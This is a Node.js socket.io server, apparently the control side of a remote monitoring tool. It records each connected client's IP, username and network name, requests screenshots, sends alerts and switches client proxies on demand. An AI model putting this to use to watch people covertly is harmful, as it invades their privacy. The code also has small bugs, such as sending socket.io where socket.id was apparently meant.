var fs = require("fs");
const readline = require("readline");
var path = require('path')

/* HTTP and Socket*/
var app = require("express")();
var http = require("http").Server(app);
var io = require("socket.io")(http);
var express = require("express");

app.get("/", function(req, res) {
  res.sendFile(__dirname + "/index.html");
});
app.use(express.static(path.join(__dirname, '/')));

var clients = [];
var usuarios = [];
io.on("connection", function (socket) {


  socket.emit("ClientId", socket.io);

  socket.emit("obterInfoMachine", "get");
  socket.emit("update", "global");
  attUsuarios();
  socket.on("entrar", function(recebido) {
    console.log(
      "Conexão recebida de: " + recebido + " Host" + socket.handshake.address
    );
    
    socket.Apelido = recebido;
  });

  socket.on("infoMachine", function(retorno) {
    var json = JSON.parse(retorno);

    socket.IP = json.IP;
    
    socket.Usuario = json.Usuario;
    socket.NomeRede = json.NomeRede;
    socket.Version = json.Version;
    socket.NomeUsuario = json.Nome;
    
    clients[socket.id] = socket;
    attUsuarios();
    //console.table(usuarios);
    
  });
  socket.on("enviarNome", function (msg,id) {
    try {
      clients[id].emit("setarNome", msg);
    } catch{ }
  });
  socket.on("enviarAlert", function (msg,id) {
    try {
      clients[id].emit("alert", msg);
    } catch{ }
  });
  
  socket.on("setarProxy", function (status, id) {
    try {
        clients[id].emit("proxy", status);
    }catch { }
  });

  socket.on("solicitarPrint", function (id) {
    try {
      clients[id].emit("obterPrint", "get");
    } catch{ }
  });
  socket.on("atividade", function(atv){
    io.emit("atividadeUsuario",atv,socket.id);
  });

  socket.on("print", function(from) {
    io.emit("printscreen", from,socket.id);
  });



  socket.on("disconnect", function() {
    console.log(`Desconectado: ${socket.Apelido}`);
    delete clients[socket.id];
    attUsuarios();
  });


});

function attUsuarios() {
  usuarios = [];
    for (indice in clients) {
      
      let infoJson = {
        "ID": clients[indice].id,
        "IP": clients[indice].IP,
        "Apelido": clients[indice].Apelido,
        "Usuario": clients[indice].Usuario,
        "NomeUsuario": clients[indice].NomeUsuario,
        "NomeRede":clients[indice].NomeRede,
        "Version":clients[indice].Version,
      };
      usuarios.push(infoJson);
  }
  io.emit("users", usuarios);
}

app.use(express.static(__dirname + "/node_modules"));
app.get("/", function(req, res) {
  res.send("<h1>A</h1>");
});
/* */

for (var i = 0; i < 60; i++) console.log(" ");

http.listen(3000, function() {
  console.log("Server iniciando na porta: 3000");
});
